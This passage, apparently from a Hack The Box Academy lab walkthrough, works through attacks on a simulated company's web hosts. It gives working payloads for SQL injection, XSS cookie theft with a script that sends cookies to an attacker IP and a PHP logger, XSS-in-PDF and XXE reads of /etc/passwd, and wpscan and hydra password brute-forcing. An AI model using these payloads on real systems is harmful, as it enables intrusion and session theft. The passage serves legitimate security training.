<p>Let&#39;s try to brute-force one of the account passwords using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt">this</a> wordlist from the <code>SecLists</code> GitHub repo. Using <code>WPScan</code> again, we get a hit for the <code>ilfreightwp</code> account.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wpscan --url http:/</span>/ir.inlanefreight.local -P passwords.txt -U ilfreightwp

&lt;SNIP&gt;

[+] Performing password attack on Xmlrpc against <span class="hljs-number">1</span> user/s
[SUCCESS] - ilfreightwp / password1                                                                              
Trying ilfreightwp <span class="hljs-regexp">/ 123123 Time: 00:00:00 &lt;===                                &gt; (10 /</span> <span class="hljs-number">109</span>)  <span class="hljs-number">9.17</span>%  <span class="hljs-string">ETA:</span> ??:??:??

[!] Valid Combinations Found:
 | <span class="hljs-string">Username:</span> ilfreightwp, <span class="hljs-string">Password:</span> password1

[!] No WPScan API Token given, <span class="hljs-keyword">as</span> a result vulnerability data has not been output.
[!] You can get a free API token with <span class="hljs-number">25</span> daily requests by registering at <span class="hljs-string">https:</span><span class="hljs-comment">//wpscan.com/register</span>

[+] <span class="hljs-string">Finished:</span> Mon Jun <span class="hljs-number">20</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span>:<span class="hljs-number">34</span> <span class="hljs-number">2022</span>
[+] Requests <span class="hljs-string">Done:</span> <span class="hljs-number">186</span>
[+] Cached <span class="hljs-string">Requests:</span> <span class="hljs-number">7</span>
[+] Data <span class="hljs-string">Sent:</span> <span class="hljs-number">54.2</span> KB
[+] Data <span class="hljs-string">Received:</span> <span class="hljs-number">253.754</span> KB
[+] Memory <span class="hljs-string">used:</span> <span class="hljs-number">241.836</span> MB
[+] Elapsed <span class="hljs-string">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">16</span>
</code></pre>
<p>From here, we can browse to <code>http://ir.inlanefreight.local/wp-login.php</code> and log in using the credentials <code>ilfreightwp:password1</code>. Once logged in, we&#39;ll be directed to <code>http://ir.inlanefreight.local/wp-admin/</code> where we can browse to <code>http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwenty</code> to edit the 404.php file for the inactive theme <code>Twenty Twenty</code> and add in a PHP web shell to get remote code execution. After editing this page and achieving code execution following the steps in the <a href="https://academy.hackthebox.com/module/113/section/1208">Attacking WordPress</a> section of the <code>Attacking Common Applications</code> module, we can record yet another finding for <code>Weak WordPress Admin Credentials</code> and recommend that our client implement several hardening measures if they plan to leave this WordPress site exposed externally.</p>
<hr>
<h3 id="status-inlanefreight-local">status.inlanefreight.local</h3>
<p>This site looks like another forgotten one that shouldn&#39;t be exposed to the internet. It seems like it&#39;s some sort of internal application to search through logs. Entering a single quote (<code>&#39;</code>) throws a MySQL error message which indicates the presence of a SQL injection vulnerability: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;%&#39;&#39; at line 1</code>. We can exploit this manually using a payload such as:</p>
<p>Code: sql</p>
<pre><code class="lang-sql">' union <span class="hljs-keyword">select</span> <span class="hljs-literal">null</span>, <span class="hljs-keyword">database</span>(), <span class="hljs-keyword">user</span>(), @@<span class="hljs-keyword">version</span> <span class="hljs-comment">-- //</span>
</code></pre>
<p>This is an example of a <a href="https://academy.hackthebox.com/module/33/section/806">SQL Injection UNION attack</a>.</p>
<p>We can also use sqlmap to exploit this also. First, capture the POST request using Burp, save it to a file, and mark the <code>searchitem</code> parameter with a <code>*</code> so sqlmap knows where to inject.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: status.inlanefreight.local
<span class="hljs-attribute">Content-Length</span>: 14
<span class="hljs-attribute">Cache-Control</span>: max-age=0
<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
<span class="hljs-attribute">Origin</span>: http://status.inlanefreight.local
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="hljs-attribute">Referer</span>: http://status.inlanefreight.local/
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.9
<span class="hljs-attribute">Cookie</span>: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
<span class="hljs-attribute">Connection</span>: close

<span class="ini"><span class="hljs-attr">searchitem</span>=*</span>
</code></pre>
<p>Next, we run this through sqlmap as follows:</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -r sqli.txt <span class="hljs-comment">--dbms=mysql </span>

&lt;SNIP&gt;

[<span class="hljs-number">00</span>:<span class="hljs-number">07</span>:<span class="hljs-number">24</span>] [INFO] (custom) POST parameter '#<span class="hljs-number">1</span>*' <span class="hljs-keyword">is</span> <span class="hljs-symbol">'MySQL</span> UNION query (<span class="hljs-keyword">NULL</span>) - <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">20</span> columns' injectable
(custom) POST parameter '#<span class="hljs-number">1</span>*' <span class="hljs-keyword">is</span> vulnerable. Do you want <span class="hljs-keyword">to</span> keep testing the <span class="hljs-keyword">others</span> (<span class="hljs-keyword">if</span> any)? [y/N] n
sqlmap identified the following injection point(s) <span class="hljs-keyword">with</span> a total <span class="hljs-keyword">of</span> <span class="hljs-number">59</span> HTTP(s) requests:
<span class="hljs-comment">---</span>
Parameter: #<span class="hljs-number">1</span>* ((custom) POST)
    <span class="hljs-keyword">Type</span>: <span class="hljs-built_in">boolean</span>-based blind
    Title: <span class="hljs-keyword">AND</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (MySQL comment)
    Payload: searchitem=%' <span class="hljs-keyword">AND</span> <span class="hljs-number">6921</span>=<span class="hljs-number">6921</span>#

    <span class="hljs-keyword">Type</span>: <span class="hljs-literal">error</span>-based
    Title: MySQL &gt;= <span class="hljs-number">5.6</span> <span class="hljs-keyword">AND</span> <span class="hljs-literal">error</span>-based - WHERE, HAVING, ORDER BY <span class="hljs-keyword">or</span> <span class="hljs-keyword">GROUP</span> BY clause (GTID_SUBSET)
    Payload: searchitem=%' <span class="hljs-keyword">AND</span> GTID_SUBSET(CONCAT(<span class="hljs-number">0</span>x716a787071,(<span class="hljs-keyword">SELECT</span> (ELT(<span class="hljs-number">5964</span>=<span class="hljs-number">5964</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">0</span>x716a7a7171),<span class="hljs-number">5964</span>) <span class="hljs-keyword">AND</span> <span class="hljs-symbol">'lVzh</span>%'=<span class="hljs-symbol">'lVzh</span>

    <span class="hljs-keyword">Type</span>: <span class="hljs-built_in">time</span>-based blind
    Title: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">time</span>-based blind (query SLEEP)
    Payload: searchitem=%' <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1227</span> FROM (<span class="hljs-keyword">SELECT</span>(SLEEP(<span class="hljs-number">5</span>)))jrOp) <span class="hljs-keyword">AND</span> <span class="hljs-symbol">'ENPh</span>%'=<span class="hljs-symbol">'ENPh</span>

    <span class="hljs-keyword">Type</span>: UNION query
    Title: MySQL UNION query (<span class="hljs-keyword">NULL</span>) - <span class="hljs-number">4</span> columns
    Payload: searchitem=%' UNION <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,CONCAT(<span class="hljs-number">0</span>x716a787071,<span class="hljs-number">0</span>x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,<span class="hljs-number">0</span>x716a7a7171),<span class="hljs-keyword">NULL</span>#
<span class="hljs-comment">---</span>
[<span class="hljs-number">00</span>:<span class="hljs-number">07</span>:<span class="hljs-number">37</span>] [INFO] the back-<span class="hljs-keyword">end</span> DBMS <span class="hljs-keyword">is</span> MySQL
web server operating system: Linux Ubuntu <span class="hljs-number">20.04</span> <span class="hljs-keyword">or</span> <span class="hljs-number">19.10</span> <span class="hljs-keyword">or</span> <span class="hljs-number">20.10</span> (eoan <span class="hljs-keyword">or</span> focal)
web application technology: Apache <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span>
back-<span class="hljs-keyword">end</span> DBMS: MySQL &gt;= <span class="hljs-number">5.6</span>
[<span class="hljs-number">00</span>:<span class="hljs-number">07</span>:<span class="hljs-number">38</span>] [INFO] fetched data logged <span class="hljs-keyword">to</span> <span class="hljs-literal">text</span> files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ <span class="hljs-number">00</span>:<span class="hljs-number">07</span>:<span class="hljs-number">38</span> /<span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">21</span>/
</code></pre>
<p>Next, we can enumerate the available databases and see that the <code>status</code> database is particularly interesting:</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ sqlmap -r sqli.txt --dbms=mysql --dbs

&lt;SNIP&gt;

---
<span class="hljs-comment">[00:09:24]</span> <span class="hljs-comment">[INFO]</span> testing MySQL
<span class="hljs-comment">[00:09:24]</span> <span class="hljs-comment">[INFO]</span> confirming MySQL
<span class="hljs-comment">[00:09:24]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL &gt;= 8.0.0
<span class="hljs-comment">[00:09:24]</span> <span class="hljs-comment">[INFO]</span> fetching database names
available databases <span class="hljs-comment">[5]</span>:
<span class="hljs-comment">[*]</span> information_schema
<span class="hljs-comment">[*]</span> mysql
<span class="hljs-comment">[*]</span> performance_schema
<span class="hljs-comment">[*]</span> status
<span class="hljs-comment">[*]</span> sys

<span class="hljs-comment">[00:09:24]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

<span class="hljs-comment">[*]</span> ending @ 00:09:24 /2022-06-21/
</code></pre>
<p>Focusing on the <code>status</code> database, we find that it has just two tables:</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -r sqli.txt <span class="hljs-comment">--dbms=mysql -D status --tables</span>

&lt;SNIP&gt;

<span class="hljs-comment">---</span>
[<span class="hljs-number">00</span>:<span class="hljs-number">10</span>:<span class="hljs-number">29</span>] [INFO] testing MySQL
[<span class="hljs-number">00</span>:<span class="hljs-number">10</span>:<span class="hljs-number">29</span>] [INFO] confirming MySQL
[<span class="hljs-number">00</span>:<span class="hljs-number">10</span>:<span class="hljs-number">29</span>] [INFO] <span class="hljs-keyword">the</span> <span class="hljs-keyword">back</span>-<span class="hljs-keyword">end</span> DBMS <span class="hljs-keyword">is</span> MySQL
web server operating system: Linux Ubuntu <span class="hljs-number">20.04</span> <span class="hljs-keyword">or</span> <span class="hljs-number">19.10</span> <span class="hljs-keyword">or</span> <span class="hljs-number">20.10</span> (eoan <span class="hljs-keyword">or</span> focal)
web <span class="hljs-built_in">application</span> technology: Apache <span class="hljs-number">2.4</span><span class="hljs-number">.41</span>
<span class="hljs-keyword">back</span>-<span class="hljs-keyword">end</span> DBMS: MySQL &gt;= <span class="hljs-number">8.0</span><span class="hljs-number">.0</span>
[<span class="hljs-number">00</span>:<span class="hljs-number">10</span>:<span class="hljs-number">29</span>] [INFO] fetching tables <span class="hljs-keyword">for</span> database: 'status'
Database: status
[<span class="hljs-number">2</span> tables]
+<span class="hljs-comment">---------+</span>
| company |
| users   |
+<span class="hljs-comment">---------+</span>
</code></pre>
<p>From here, we could attempt to dump all data from the <code>status</code> database and record yet another finding, <code>SQL Injection</code>. Try this out manually using the <a href="https://academy.hackthebox.com/module/details/33">SQL Injection Fundamentals</a> module as guidance and refer to the <a href="https://academy.hackthebox.com/module/details/58">SQLMap Essentials</a> module if you need help with the tool-based approach.</p>
<hr>
<h3 id="support-inlanefreight-local">support.inlanefreight.local</h3>
<p>Moving on, we browse the <code>http://support.inlanefreight.local</code> site and see that it is an IT support portal. Support ticketing portals may allow us to engage with a live user and can sometimes lead to a client-side attack where we can hijack a user&#39;s session via a <code>Cross-Site Scripting (XSS)</code> vulnerability. Browsing around the application, we find the <code>/ticket.php</code> page where we can raise a support ticket. Let&#39;s see if we can trigger some type of user interaction. Fill out all details for a ticket and include the following in the <code>Message</code> field:</p>
<p>Code: javascript</p>
<pre><code class="lang-javascript"><span class="xml"> "&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://10.10.14.15:9000/TESTING_THIS</span>&lt;/<span class="hljs-attr">script</span>&gt;</span><span class="undefined"></span></span>
</code></pre>
<p>Change the IP for your own and start a <code>Netcat</code> listener on port 9000 (or whatever port you desire). Click the <code>Send</code> button and check your listener for a callback to confirm the vulnerability.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp <span class="hljs-number">9000</span>

listening on [any] <span class="hljs-number">9000</span> ...
connect to [<span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>] from (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.101</span>] <span class="hljs-number">56202</span>
GET /TESTING_THIS<span class="hljs-subst">%3</span>C/script HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>:<span class="hljs-number">9000</span>
<span class="hljs-symbol">Connection:</span> keep-alive
User-Agent: HTBXSS/<span class="hljs-number">1.0</span>
<span class="hljs-symbol">Accept:</span> */*
<span class="hljs-symbol">Referer:</span> http://<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
</code></pre>
<p>This is an example of a Blind Cross-Site Scripting (XSS) attack. We can review methods for Blind XSS detection in the <a href="https://academy.hackthebox.com/module/103/section/1008">Cross-Site Scripting (XSS)</a> module.</p>
<p>Now we need to figure out how we can steal an admin&#39;s cookie so we can log in and see what type of access we can get. We can do this by creating the following two files:</p>
<ol>
<li>index.php</li>
</ol>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>])) {
    $list = explode(<span class="hljs-string">";"</span>, $_GET[<span class="hljs-string">'c'</span>]);
    <span class="hljs-keyword">foreach</span> ($list <span class="hljs-keyword">as</span> $key =&gt; $value) {
        $cookie = urldecode($value);
        $file = fopen(<span class="hljs-string">"cookies.txt"</span>, <span class="hljs-string">"a+"</span>);
        fputs($file, <span class="hljs-string">"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"</span>);
        fclose($file);
    }
}
<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<ol>
<li>script.js</li>
</ol>
<p>Code: javascript</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">new</span> Image().src=<span class="hljs-string">'http://10.10.14.15:9200/index.php?c='</span>+<span class="hljs-built_in">document</span>.cookie
</code></pre>
<p>Next, start a PHP web server on your attack host as follows:</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">php</span> <span class="hljs-selector-tag">-S</span> 0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:9200</span>
</code></pre>
<p>Finally, create a new ticket and submit the following in the message field:</p>
<p>Code: javascript</p>
<pre><code class="lang-javascript">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://10.10.14.15:9200/script.js</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>We get a callback on our web server with an admin&#39;s session cookie:</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo php -S <span class="hljs-number">0.0.0.0:9200</span>

<span class="hljs-string">[Tue Jun 21 00:33:27 2022]</span> PHP <span class="hljs-number">7</span>.<span class="hljs-number">4</span>.<span class="hljs-number">28</span> Development Server (http://<span class="hljs-number">0.0.0.0:9200</span>) started
<span class="hljs-string">[Tue Jun 21 00:33:42 2022]</span> <span class="hljs-number">10.129.203.101:40102</span> Accepted
<span class="hljs-string">[Tue Jun 21 00:33:42 2022]</span> <span class="hljs-number">10.129.203.101:40102</span> <span class="hljs-string">[200]</span>: (null) /script.js
<span class="hljs-string">[Tue Jun 21 00:33:42 2022]</span> <span class="hljs-number">10.129.203.101:40102</span> Closing
<span class="hljs-string">[Tue Jun 21 00:33:43 2022]</span> <span class="hljs-number">10.129.203.101:40104</span> Accepted
<span class="hljs-string">[Tue Jun 21 00:33:43 2022]</span> <span class="hljs-number">10.129.203.101:40104</span> <span class="hljs-string">[500]</span>: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

&lt;SNIP&gt;
</code></pre>
<p>Next, we can use a Firefox plugin such as <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm\_source=addons.mozilla.org\&amp;utm\_medium=referral\&amp;utm\_content=search">Cookie-Editor</a> to log in using the admin&#39;s session cookie.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/edit\_cookie.png" alt="text"></p>
<p>Click on the save button to save the cookie named <code>session</code> and click on <code>Login</code> in the top right. If all is working as expected, we will be redirected to <code>http://support.inlanefreight.local/dashboard.php</code>. Take some time and record yet another finding, <code>Cross-Site Scripting (XSS)</code>, noting that the finding is high-risk because it can be used to steal an active admin&#39;s session and access the ticketing queue system. Consult the <a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a> module for a refresher on XSS and the various ways this class of vulnerabilities can be leveraged, including session hijacking.</p>
<hr>
<h3 id="tracking-inlanefreight-local">tracking.inlanefreight.local</h3>
<p>The site at <code>http://tracking.inlanefreight.local/</code> allows us to enter a tracking number and receive a PDF showing the status of our order. The application takes user input and generates a PDF document. Upon PDF generation, we can see that the <code>Tracking #:</code> field takes any input (not just numbers) that we specify in the search box before hitting the <code>Track Now</code> button. If we insert a simple JavaScript payload such as <code>&lt;script&gt;document.write(&#39;TESTING THIS&#39;)&lt;/script&gt;</code> and click <code>Track Now</code>, we see that the PDF is generated and the message <code>TESTING THIS</code> is rendered, which seems to mean that the JavaScript code is executing when the webserver generates the document.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/tracking\_rendered.png" alt="text"></p>
<p>We notice that we can inject HTML as well. A simple payload such as <code>&lt;h1&gt;test&lt;/h1&gt;</code> will render in the <code>Tracking #:</code> field upon PDF generation as well. Googling for something such as <code>pdf HTML injection vulnerability</code> returns several interesting hits such as <a href="https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90">this post</a> and <a href="https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f">this post</a> discussing leveraging HTML injection, XSS, and SSRF for local file read. Now, while not covered in the <code>Penetration Tester Job Role Path</code>, it is important to note that we will often come across new things during our assessments.</p>
<hr>
<h3 id="dealing-with-the-unexpected">Dealing with The Unexpected</h3>
<p>This is where the penetration tester mindset is key. We must be able to adapt, poke and prod, and take the information we find and apply our thought process to determine what is going on. After a bit of probing, we were able to deduce that the web application generates PDF reports, and we can control the input to one field that should only accept numbers, as it seems. Through a bit of research, we were able to identify a class of vulnerability that we may not be familiar with yet, but there is considerable research and documentation on. Many researchers publish extremely detailed research from their own assessments or bug bounties, and we can often use this as a guide to try to find similar issues. No two assessments are the same, but there are only so many possible web application technology stacks, so we are bound to see certain things over and over, and soon things that were new and difficult become second nature. It is worth checking out the <a href="https://academy.hackthebox.com/module/145/section/1297">Server-side Attacks</a> module to learn more about SSRF and other server-side attacks.</p>
<p>Let&#39;s dig through some of these writeups and see if we can produce a similar result and gain local file read. Following this <a href="https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f">post</a>, let&#39;s test for local file read using <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest (XHR) objects</a> and also consulting this <a href="https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/">excellent post</a> on local file read via XSS in dynamically generated PDFS. We can use this payload to test for file read, first trying for the <code>/etc/passwd</code> file, which is world-readable and should confirm the vulnerability&#39;s existence.</p>
<p>Code: javascript</p>
<pre><code class="lang-javascript">    &lt;script&gt;
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)};
    x.open(<span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span>,<span class="hljs-string">"file:///etc/passwd"</span>);
    x.send();
    &lt;/script&gt;
</code></pre>
<p>We paste the payload into the search box and hit the <code>Track Now</code> button and the newly generated PDF displays the file&#39;s contents back to us, so we have local file read!</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/ssrf\_file\_read.png" alt="text"></p>
<p>It&#39;s worth reading these blog posts, studying this finding and its impact, and becoming familiar with this class of vulnerability. If we were to encounter something like this during a penetration test that we are unfamiliar with but seemed &quot;off,&quot; we could refer to the <a href="https://academy.hackthebox.com/module/90/section/939">Penetration Testing Process</a> to perform an analysis of the situation. If we did our research and still could not uncover the vulnerability, we should keep detailed notes of what we&#39;ve tried and our thought process and ask our peers and more senior members of our team for assistance. Pentest teams often have folks who specialize or are stronger in certain areas, so someone on the team has likely seen this or something similar.</p>
<p>Play around with this vulnerability some more and see what else you can gain access to. For now, we&#39;ll note down another high-risk finding, <code>SSRF to Local File Read</code>, and move on.</p>
<hr>
<h3 id="vpn-inlanefreight-local">vpn.inlanefreight.local</h3>
<p>It&#39;s common to come across VPN and other remote access portals during a penetration testing engagement. This appears to be a Fortinet SSL VPN login portal. During testing, we confirmed that the version in use was not vulnerable to any known exploits. This could be an excellent candidate for password spraying in a real-world engagement, provided we take a careful and measured approach to avoid account lockout.</p>
<p>We try a few common/weak credential pairs but get the following error message: <code>Access denied.</code>, so we can move on from here to the next application.</p>
<hr>
<h3 id="gitlab-inlanefreight-local">gitlab.inlanefreight.local</h3>
<p>Many companies host their own GitLab instances and sometimes don&#39;t lock them down properly. As covered in the <a href="https://academy.hackthebox.com/module/113/section/1216">GitLab - Discovery &amp; Enumeration</a> section of the <code>Attacking Common Applications</code> module, there are several steps that an admin can implement to limit access to a GitLab instance such as:</p>
<ul>
<li>Requiring admin approval for new sign-ups</li>
<li>Configured lists of domains allowed for sign-ups</li>
<li>Configuring a deny list</li>
</ul>
<p>Occasionally we will come across a GitLab instance that is not adequately secured. If we can gain access to a GitLab instance, it is worth digging around to see what type of data we can find. We may discover configuration files containing passwords, SSH keys, or other information that could lead to furthering our access. After registering, we can browse to <code>/explore</code> to see what projects, if any, we have access to. We can see that we can access the <code>shopdev2.inlanefreight.local</code> project, which gives us a hint to another subdomain that we did not uncover using the DNS Zone Transfer and likely could not find using subdomain brute-forcing.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/gitlab\_explore.png" alt="text"></p>
<p>Before exploring the new subdomain, we can record another high-risk finding: <code>Misconfigured GitLab Instance</code>.</p>
<hr>
<h3 id="shopdev2-inlanefreight-local">shopdev2.inlanefreight.local</h3>
<p>Our enumeration of the GitLab instance led to another vhost, so let&#39;s first add it to our <code>/etc/hosts</code> file so we can access it. Browsing to <code>http://shopdev2.inlanefreight.local</code>, we&#39;re redirected to a <code>/login.php</code> login page. Typical authentication bypasses don&#39;t get us anywhere, so we go back to the basics per the <code>Attacking Common Applications</code> module <a href="https://academy.hackthebox.com/module/113/section/1088">Application Discovery &amp; Enumeration</a> section and try some weak credential pairs. Sometimes it&#39;s the simplest things that work (and yes, we do see this type of stuff in production, both internal AND external) and can log in with <code>admin:admin</code>. Once logged in, we see some sort of online store for purchasing wholesale products. When we see <code>dev</code> in a URL (especially external-facing), we can assume it is not production-ready and worth digging into, especially because of the comment <code>Checkout Process not Implemented</code> near the bottom of the page.</p>
<p>We can test the search for injection vulnerabilities and search around for IDORs and other flaws but don&#39;t find anything particularly interesting. Let&#39;s test the purchasing flow, focusing on the shopping cart checkout process and capture the requests in Burp Suite. Add an item or two to the cart and browse to <code>/cart.php</code> and click the <code>I AGREE</code> button so we can analyze the request in Burp. Looking at Burp, we see that a <code>POST</code> request is made with <code>XML</code> in the body like so:</p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
    <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">subtotal</span>&gt;</span>
      undefined
     <span class="hljs-tag">&lt;/<span class="hljs-name">subtotal</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">userid</span>&gt;</span>
      1206
     <span class="hljs-tag">&lt;/<span class="hljs-name">userid</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<p>Think back to the module content, namely the <a href="https://academy.hackthebox.com/module/134/section/1203">Web Attacks</a> module; this looks like a good candidate for <code>XML External Entity (XXE) Injection</code> because the form seems to be sending data to the server in XML format. We try a few payloads and finally can achieve local file read to view the contents of the <code>/etc/passwd</code> file with this payload:</p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE userid [
  &lt;!ENTITY xxetest SYSTEM "file:///etc/passwd"&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">subtotal</span>&gt;</span>
        undefined
    <span class="hljs-tag">&lt;/<span class="hljs-name">subtotal</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userid</span>&gt;</span>
        &amp;xxetest;
    <span class="hljs-tag">&lt;/<span class="hljs-name">userid</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/163/xxe\_passwd.png" alt="text"></p>
<p>Let&#39;s jot down another high-risk finding, <code>XML External Entity (XXE) Injection</code> (we&#39;ve got quite the list so far!), and move on to the last vhost/subdomain.</p>
<hr>
<h3 id="monitoring-inlanefreight-local">monitoring.inlanefreight.local</h3>
<p>We discovered the <code>monitoring</code> vhost earlier, so we won&#39;t repeat the process. We used ffuf, but this enumeration can also be performed with other tools. Give it a try with <code>GoBuster</code> to become comfortable with more tools. Browsing to <code>http://monitoring.inlanefreight.local</code> results in a redirect to <code>/login.php</code>. We can try some authentication bypass payloads and common weak credential pairs but don&#39;t get anywhere, just receiving the <code>Invalid Credentials!</code> error every time. Since this is a login form, it is worth exploring further so we can fuzz it a bit with Burp Intruder to see if we can provoke an error message indicative of a SQL injection vulnerability, but we are not successful.</p>
<p>An analysis of the POST request and response in Burp Suite does not yield anything interesting. At this point, we&#39;ve exhausted nearly all possible web attacks and turn back to the module content, remembering the <a href="https://academy.hackthebox.com/module/57/section/503">Login Brute Forcing</a> module that focuses on the tool <code>hydra</code>. This tool can be used to brute-force HTTP login forms, so let&#39;s give it a go. We&#39;ll use the same <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt">wordlist</a> from the <code>SecLists</code> GitHub repo as earlier.</p>
<p>We&#39;ll set up <code>hydra</code> to perform the brute-forcing attack, specifying the <code>Invalid Credentials!</code> error message to filter out invalid login attempts. We get a hit for the credential pair <code>admin:12qwaszx</code>, a common &quot;keyboard walk&quot; password that is easy to remember but can be very easily brute-forced/cracked.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&amp;password=^PASS^:Invalid Credentials!"

